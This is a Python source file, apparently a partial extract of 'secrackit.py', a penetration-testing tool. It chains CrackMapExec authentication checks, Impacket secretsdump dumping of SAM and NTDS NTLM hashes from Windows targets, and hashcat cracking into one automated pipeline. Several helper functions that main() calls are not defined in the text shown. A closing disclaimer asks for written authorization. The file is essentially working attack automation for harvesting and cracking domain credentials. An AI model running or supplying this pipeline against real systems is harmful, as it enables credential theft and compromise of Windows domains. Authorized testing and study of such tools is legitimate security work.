# Removes duplicate accounts in SAM results
def remove_duplicate_hashes(removed_computer_hashes):

	# Create new list which doesn't include duplicate hashes through comprehension.
	remove_duplicate_hashes = [[i for n, i in enumerate(sublist) if i not in sublist[:n]] for sublist in removed_computer_hashes]

	# Return new list.
	return(remove_duplicate_hashes)



# Extract dictionary key values(a list), and saves output to combined list.
def dict_key_value_to_IP_HASH(final_IP_to_hash):

	# Create empty list
	dict_to_single_list = list()

	# For each key in dictionary...
	for key in final_IP_to_hash:

		# For each list in key...
		for lists in final_IP_to_hash[key]:

			# var "combined" contains key, lists order
			combined = (key, lists)

			# Append new list of KEY:VALUE
			dict_to_single_list.append(combined)

	# Return list 
	return(dict_to_single_list)



# Convert list of tuples to list of strings, adding hyphen to divide IP from account.
def tuples_to_list(dictionary_of_lists_to_list_of_tuples):

	# "result" var holds new list, which converted from tuple to strings and joined with hyphen.
	result = ['-'.join (i) for i in dictionary_of_lists_to_list_of_tuples]

	# Return list of strings
	return(result)



# hashes to be written to file
def export_hashes_file(directory_location, NetworkID_for_files):
	
	# file location to be used when exporting sorted,labeled hashes to file
	export_hashes_file_location = directory_location + "exported_hashes_" + NetworkID_for_files + ".txt"

	# Return location
	return(export_hashes_file_location)



# Create file and append IP-{SAM, NTDS}-{domain.name\\}-ACCOUNT-RID-NTLM hashes to file.
def list_of_hashes_to_file(list_of_hashes_as_strings, export_hashes_location):
	
	# Check if "list_of_hashes_as_strings" is empty...
	# "list_of_hashes_as_strings" is the parsed secretsdump list of strings.
	is_list_completely_empty = all(item is None for item in list_of_hashes_as_strings)

	# if the "list_of_hashes_as_strings" is NOT
	if is_list_completely_empty != True:

		# Open new file with write permission with naming convention.
		with open(export_hashes_location, "a") as file:

			# var for appending each via .join and a new line each
			hashes_to_write = "\n".join(list_of_hashes_as_strings)

			# Write var "hashes_to_write" to file until done then close file
			file.write(hashes_to_write)

		# Return terminal feedback of progress...
		print("Secretsdump successfully dumped some hashes!")

		return(export_hashes_location)

	else:
		# If account used doesn't have admin access, it will likely fail but worth trying...
		sys.exit("\n\nIt was worth a try...\nSecretsdump has failed administrative access to the target(s) above!\nNO NTLM hashes were dumped and no additional files were created!\n\nHashcat will not run!")



# Hashcat potfile location, which is used to keep results separate between runs.
def hashcat_potfile_location(NetworkID_for_files, directory_location):

	# File location for potfile, used for each run.
	hashcat_potfile_location_is = directory_location + "hashcat.potfile_" + str(NetworkID_for_files)

	# Return location value
	return(hashcat_potfile_location_is)



# Run hashcat against exported hashes
def run_hashcat(potfile_location, file_for_hashcat_location, wordlist_location, rule_location):

	# Terminal feedback for which wordlist and/or rule hashcat is using...
	print("\n\n\nAttempting to crack NTLM hashes!\n\nHashcat settings:\n  Wordlist: " + wordlist_location + "\n  Rule: No rule")

	# Code for taking in ntlm_hashes_file and outputting hashcat results
	hashcat_cmd = subprocess.run(["hashcat", "-m", "1000", "--username", file_for_hashcat_location, wordlist_location, "--potfile-path", potfile_location], capture_output=True)

	# To convert the byte output to string.
	hashcat_cmd_to_str = hashcat_cmd.stdout.decode()

	# Return string of hashcat results for exporting
	return(hashcat_cmd_to_str)



# Run hashcat against exported hashes WITH custom rule
def run_hashcat_rule(potfile_location, file_for_hashcat_location, wordlist_location, rule_location):

	# Terminal feedback for which wordlist and/or rule hashcat is using...
	print("\n\n\nAttempting to crack NTLM hashes!\n\nHashcat settings:\n  Wordlist: " + wordlist_location + "\n  Rule: " + rule_location)

	# Code for taking in ntlm_hashes_file and outputting hashcat results
	hashcat_cmd = subprocess.run(["hashcat", "-m", "1000", "--username", file_for_hashcat_location, wordlist_location, "--potfile-path", potfile_location, "--rules-file", rule_location], capture_output=True)

	# To convert the byte output to string.
	hashcat_cmd_to_str = hashcat_cmd.stdout.decode()

	# Return string of hashcat results for exporting
	return(hashcat_cmd_to_str)



# File location for raw hashcat output
def hashcat_raw_location(NetworkID_for_files, directory_location):

	# File location for hashcat raw output to file.
	hashcat_raw_location = directory_location + "hashcat_data_" + str(NetworkID_for_files) + ".txt"

	# Return file location for raw hashcat
	return(hashcat_raw_location)



# export raw hashcat output to file
def print_hashcat_raw(hashcat_results, hashcat_raw_file_location):

	# Export to file the raw hashcat results
	# Create file variable where data is written.
	hashcat_results_output_file = hashcat_raw_file_location

	# Open new file with write permission with naming convention.
	with open(hashcat_results_output_file, "a") as file:

		# Since hashcat is ran once together, no need to separate each string.
		hashcat_output_to_write = "".join(hashcat_results)

		# Write data to file
		file.write(hashcat_output_to_write)

	# Return hashcat raw hashcat output, if needed.
	return(hashcat_results_output_file)



# Display cracked hash results, which hashcat presents in output.
def check_crack_percentage(hashcat_results):

	# Var holding string
	NTDS_string_check = "Session..........: hashcat"
	
	# If string is found in "hashcat_results"...
	if NTDS_string_check in hashcat_results:

		# Create empty list called results.
		results = ""

		# Create strings we'll index for to find there locations, which we'll use for parsing.
		string1 = "Vec:"
		string2 = "\nProgress.........: "

		# Variables that find and store the location of each index found.
		index1 = hashcat_results.index(string1)
		index2 = hashcat_results.index(string2)

		# Add string chars between index1 plus the length of index to index 2.
		for index in range(index1 + len(string2) + 1, index2):
				results = results + hashcat_results[index]

		# Else if nothing is found...

	else:

		# Pass and move onto next item in list.
		pass
	
	# Can't get the "..." with above, so doing a re.sub to remove it.
	clean_hashcat_percentage = re.sub("...: ", "", results)

	# Print to screen the percentage of successful cracked NTLM hashes.
	print("\nHashcat success rate: " + clean_hashcat_percentage + "\n")



# Run hashcat again but with --show. This will result in our formatted output and creds appended!
def final_cracked_list(potfile_location, file_for_hashcat_location):

	# Code for taking in ntlm_hashes_file and outputting hashcat results
	hashcat_results_cmd = subprocess.run(["hashcat", "-m", "1000", "--username", file_for_hashcat_location, "/usr/share/wordlists/rockyou.txt", "--potfile-path", potfile_location, "--show"], capture_output=True)

	# To convert the byte output to string.
	hashcat_results_cmd_to_str = hashcat_results_cmd.stdout.decode()

	print("Cracked hashes exported to potfile:\n" + potfile_location + "\n")

	return(hashcat_results_cmd_to_str)



# Create final file that holds --show from hashcat and the nice IP-account-etc format.
def create_final_hashcat_results(directory_location, NetworkID_for_files):

	# Final output file which will contain the final output.
	final_hashcat_results_file = directory_location + "hashcat_FINAL_results_" + str(NetworkID_for_files) + ".txt"

	# Return file location.
	return(final_hashcat_results_file)



# Export to file and show on terminal the results of --show from hashcat.
def export_file_and_terminal_results(final_cracked_list_results, final_hashcat_results_location):

	# Open new file with write permission with naming convention.
	export_final_data = open(final_hashcat_results_location, "a")

	# Write "removed_ansi_CME_output" to opened file.
	export_final_data.write(final_cracked_list_results)

	# Close file, so it's no longer in use.
	export_final_data.close()

	print("Final hashcat results exported:\n" + final_cracked_list_results)




def main():

	#################################
	##### Argparse - Beginning #####

	#### Args Explained
	# DC_IP - since the script defaults to AD auths, the DC_IP is required.
	# Domain - since the script defaults to AD auths, domain.name aka domain is required.
	# Target_IPs - targets CME(CrackMapExec) and Impacket-secretsdump(secretsdump) will attack.
	# Account - AD account both CME and secretsdump will use for their attacks.
	# {pw, ntlm} - "pw" or "ntlm" argument is required as it helps determine which is provided.
	# Pass_or_NTLM_val - value of password or NTLM hash required by CME and secretsdump.
	### optional below
	# -localauth - tells CME and secretsdump to auth against the IPs(hosts) and NOT the DC.
	# -out_dir - By default, files created by secrackit.py will be exported to the directory which secrackit.py is launched from. This option allows you to specify a different root directory.
	# -wordlist - Specify a custom wordlist for hashcat. /usr/share/wordlists/rockyou.txt runs by default when absent.
	# -rule - Specify location of custom rule for hashcat. No rule used when absent.

	parser = argparse.ArgumentParser(description="'secrackit.py' - Automates Windows auth checks(CrackMapExec), parses secretsdump(Impacket-secretsdump), and cracks NTLM hashes(Hashcat). For details, credits, and disclaimers: open \"secrackit.py\" in a text editor.", epilog="Example syntax: \"./secrackit.py 192.168.1.10 domain.local IPs.txt hackmyacct pw BadPassword123 -local -out_dir ~/Desktop/toolsoutput -wordlist ~/Desktop/wordlists/customwordlist.txt -rule ~/media/hashcatrules/OneRule.rule\"")

	# Required arguments needed to run the script.
	parser.add_argument("DC_IP", action="store", help="IP of domain controller.")
	parser.add_argument("Domain", action="store", help="Domain.name where target(s) belong.", type=str)
	parser.add_argument("Target_IPs", action="store", help="Target IP, CIDR, or file containing either IP or CIDR format. (One per line)", type=str)
	parser.add_argument("Account", action="store", help="AD account used for authentication.", type=str)
	parser.add_argument("Flag_Password_or_NTLM", action="store", help="Specify if providing a password (\"pw\") or NTLM hash (\"ntlm\").", choices=(['pw', 'ntlm']), type=str)
	parser.add_argument("Pass_or_NTLM_val", action="store", help="Password or NTLM hash associated with the provided AD account.", type=str)


	# Optional arguments for specifying special options.
	parser.add_argument("-localauth", action="store_true", help="Tells CME & Secretsdump to run against local authentication.")
	parser.add_argument("-out_dir", action="store", nargs="?", const=1, help="Output directory for findings. Script default's to directory secrackit.py is executed from.", type=str)
	parser.add_argument("-wordlist", action="store", nargs="?", const=1, help="Specify custom wordlist location for Hashcat. (Default is /usr/share/wordlists/rockyou.txt)", type=str)
	parser.add_argument("-rule", nargs="?", const=1, help="Specify custom rule location for Hashcat. (Default is none)", type=str)


	# Parse user arguments to allow code interactions.
	args = parser.parse_args()
	user_input_dc_ip = args.DC_IP
	user_input_domain = args.Domain
	user_input_target_ips = args.Target_IPs
	user_input_username = args.Account
	needs_converted_pw_hash_flag = args.Flag_Password_or_NTLM
	user_input_password_or_ntlm_value = args.Pass_or_NTLM_val
	user_input_dir_location = args.out_dir
	user_input_local_flag = args.localauth
	user_input_wordlist_loc = args.wordlist
	user_input_rule_loc = args.rule


	##### Argparse - Ending #####
	##############################


###Functions above ###
######################




	#####################################
	##### Call functions - STARTING #####


	#### Validate user IP input return to variable.
	validated_target_ip = validate_target_ips(user_input_target_ips)



	#### Validate "-wordlist" aka "user_input_wordlist_loc" is present or not.
	wordlist_location = validate_wordlist_input(user_input_wordlist_loc)



	#### Validate "-rule" aka "user_input_rule_loc" is present or not.
	rule_location = validate_rule_input(user_input_rule_loc)



	#### Argparse flags 'pw' and 'ntlm' are required options for input.
	#### This converts them over to needed value for operating CrackMapExec.
	converted_pw_hash_flag = convert_pw_or_hash_flag(needs_converted_pw_hash_flag, )



	#### Parse NTLM or password input to determine which it is and provide feedback if needed.
	validated_NTLM_hash_or_password = was_valid_hash_or_password_provided(user_input_password_or_ntlm_value, converted_pw_hash_flag)



	#### Run CME against domain. If results authenticate or not, show response.
	#### If successful, return results in decoded string format, to parse.
	if user_input_local_flag == True:

		run_crackmapexec_function_output = run_crackmapexec_against_local(validated_target_ip, user_input_username, converted_pw_hash_flag, validated_NTLM_hash_or_password, user_input_local_flag)

	else:

		run_crackmapexec_function_output = run_crackmapexec_against_domain(validated_target_ip, user_input_domain, user_input_username, converted_pw_hash_flag, validated_NTLM_hash_or_password, user_input_local_flag)



	#### Remove ANSI characters from the CME output.
	removed_ansi_CME_output = remove_ansi_escape(run_crackmapexec_function_output)



	#### Parse raw string from "run_crackmapexec" results.
	parsed_CME_string = parse_crackmapexec_results_string(removed_ansi_CME_output)



	#### Convert parsed data to list then sort. Also display results to terminal.
	CME_string_to_list = convert_parsed_CME_to_list(parsed_CME_string)



	#### Create IP list from parsed CME list.
	IP_list_for_secretsdump =  create_IP_list(CME_string_to_list)



	#### Create NetworkID for files.
	NetworkID_for_files = make_networkID(IP_list_for_secretsdump)



	#### Create directory in current directory named (date/time)-secrackit.
	#### Return the full path to the newly created directory.
	directory_location = create_dir_for_dropping_that_output(user_input_dir_location)



	#### Create file location for CME data export.
	cmd_data_file_location = cme_data_file(directory_location, NetworkID_for_files)



	#### Export CME results to file in newly created "directory_location" variable.
	export_CME_to_file(removed_ansi_CME_output, cmd_data_file_location)



	# Create empty list, either local or domain function below, to dump data into.
	secretsdump_raw_list = list()



	# Local authentication with secretsdump. Run through for loop and append results.
	print("\n\n\nStarting secretsdump attacks...")

	if user_input_local_flag == True:

		for IP in range(0, len(IP_list_for_secretsdump)):
			user_input_domain = IP_list_for_secretsdump[IP]
			var_secretsdump_raw = run_impacket_secretsdump(user_input_domain, user_input_username, validated_NTLM_hash_or_password, IP_list_for_secretsdump[IP])
			secretsdump_raw_list.append(var_secretsdump_raw)


	# Domain authentication with secretsdump. Run through for loop and append results.
	else:

		for IP in range(0, len(IP_list_for_secretsdump)):
			var_secretsdump_raw = run_impacket_secretsdump(user_input_domain, user_input_username, validated_NTLM_hash_or_password, IP_list_for_secretsdump[IP])
			secretsdump_raw_list.append(var_secretsdump_raw)



	#### Create file location for secretsdump raw export.
	secretsdump_raw_file_location = secretsdump_raw_file(NetworkID_for_files, directory_location)



	#### Export raw secretsdump results to file in newly created "directory_location" variable.
	export_secretsdump_raw_list(secretsdump_raw_list, secretsdump_raw_file_location)



	#### Extract SAM section from "secretsdump_raw_list" and labels each hash found.
	SAM_section_parsed = list()
	for item in range(0, len(secretsdump_raw_list)):
		SAM_section = remove_SAM_section(secretsdump_raw_list[item])
		SAM_section_parsed.append(SAM_section)



	#### Extract NTDS section from "secretsdump_raw_list" and labels each hash found.
	NTDS_section_parsed = list()
	for item in range(0, len(secretsdump_raw_list)):
		NTDS_section = remove_NTDS_section(secretsdump_raw_list[item])
		NTDS_section_parsed.append(NTDS_section)



	#### Combine SAM matrix with NTDS matrix, row-wise, so results are per IP(in order).
	combined_SAM_NTDS_results = combine_convert_SAM_and_NTDS_results(SAM_section_parsed, NTDS_section_parsed)



	#### Parse secretsdump results.
	#### Each secretsdump result is an item in list called secretsdump_raw_list.
	#### Runs for loop for each in list through a function called "parsed_secretsdump_list".
	#### Returning a list containing hashcat friendly formatted hashes.
	#### Each returned list is appended to new list called ordered_per_IP_hash_list.
	ordered_per_IP_hash_list = list()
	for asset in range(0, len(combined_SAM_NTDS_results)):
		seperate_parsed_lists = parsed_secretsdump_list(combined_SAM_NTDS_results[asset])	
		ordered_per_IP_hash_list.append(seperate_parsed_lists)



	#### Remove unwanted hashes. E.g. Default accounts aka aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 , WDAG, etc
	removed_default_hashes = remove_default_hashes(ordered_per_IP_hash_list)



	#### Remove computer hashes aka accounts with $- appended to account name.
	removed_computer_hashes = remove_computer_hashes(removed_default_hashes)



	#### Remove duplicate account:RID:NTLM... sometimes you'll see dup admin accounts.
	removed_duplicate_hashes = remove_duplicate_hashes(removed_computer_hashes)



	#### IP list from each secretsdump list for dictionary list below.
	Found_IPs_parsed = list()
	for IP in range(0, len(secretsdump_raw_list)):
		IP_from_secrets = parse_IP_from_secrets(secretsdump_raw_list[IP])
		Found_IPs_parsed.append(IP_from_secrets)



	#### Creating dictionary to hold IP as keys and next the username:hashes of each IP.
	secrets_dump_dictionary = {key: None for key in Found_IPs_parsed}



	#### Creating dictionary holding the IPs attacked(keys) and their related and hashcat friendly formatted hash lists(values).
	zip_dict_and_list = zip(secrets_dump_dictionary, removed_duplicate_hashes)
	final_IP_to_hash = {key:value for key,value in zip_dict_and_list}



	#### Convert dictionary to list of tuples.
	dictionary_of_lists_to_list_of_tuples = dict_key_value_to_IP_HASH(final_IP_to_hash)



	#### Create file for hash export.
	export_hashes_location = export_hashes_file(directory_location, NetworkID_for_files)



	#### Convert list of tuples to list of strings.
	list_of_hashes_as_strings = tuples_to_list(dictionary_of_lists_to_list_of_tuples)



	#### Write list of strings to file for hashcat to ingest.
	file_for_hashcat_location = list_of_hashes_to_file(list_of_hashes_as_strings, export_hashes_location)



	#### Create potfile location.
	potfile_location = hashcat_potfile_location(NetworkID_for_files, directory_location)



	#### Run hashcat with or without custom rule presented...
	#### If "-rule" argument is equal to None, then run hashcat with no rule passed.
	if rule_location == None:

		# Running hashcat WITHOUT a custom rule present.
		# Passing "rule_location" for terminal feedback.
		hashcat_results = run_hashcat(potfile_location, file_for_hashcat_location, wordlist_location, rule_location)

	else:

		# Running hashcat WITH validated custom rule present.
		# Passing "rule_location" for both hashcat and terminal feedback.
		hashcat_results = run_hashcat_rule(potfile_location, file_for_hashcat_location, wordlist_location, rule_location)



	#### Create raw hashcat output file location.
	hashcat_raw_file_location = hashcat_raw_location(NetworkID_for_files, directory_location)



	#### Export hashcat raw output to file.
	hashcat_output_location = print_hashcat_raw(hashcat_results, hashcat_raw_file_location)



	#### Parses hashcat output for % of successful cracks.
	percentage_of_cracked = check_crack_percentage(hashcat_results)



	#### Gather final hashcat results by assigning decoded output of --show to var.
	final_cracked_list_results = final_cracked_list(potfile_location, file_for_hashcat_location)


	#### Create file for final hashcat results.
	final_hashcat_results_location = create_final_hashcat_results(directory_location, NetworkID_for_files)


	#### Print off results to terminal and export to file.
	exported_file_and_terminal_results = export_file_and_terminal_results(final_cracked_list_results, final_hashcat_results_location)


	##### Call functions - ENDING #####
	###################################



# Run the script and allow importing.
if __name__ == "__main__":
	main()








################## DISCLAIMER(s) ##################

#### secrackit.py disclaimer below -- as of 1-23-24

# 1. I take zero(0) responsibility for your actions if and when you ever use(execute) "secrackit.py".

# 2. Do NOT execute "secrackit.py" without prior WRITTEN authorization of the owners of ANY target(s), system(s), and/or network(s) secrackit.py may run against.

# 3. Do NOT use "secrackit.py" for illegal activities and/or purposes.

#### secrackit.py disclaimer above -- as of 1-23-24
########################################





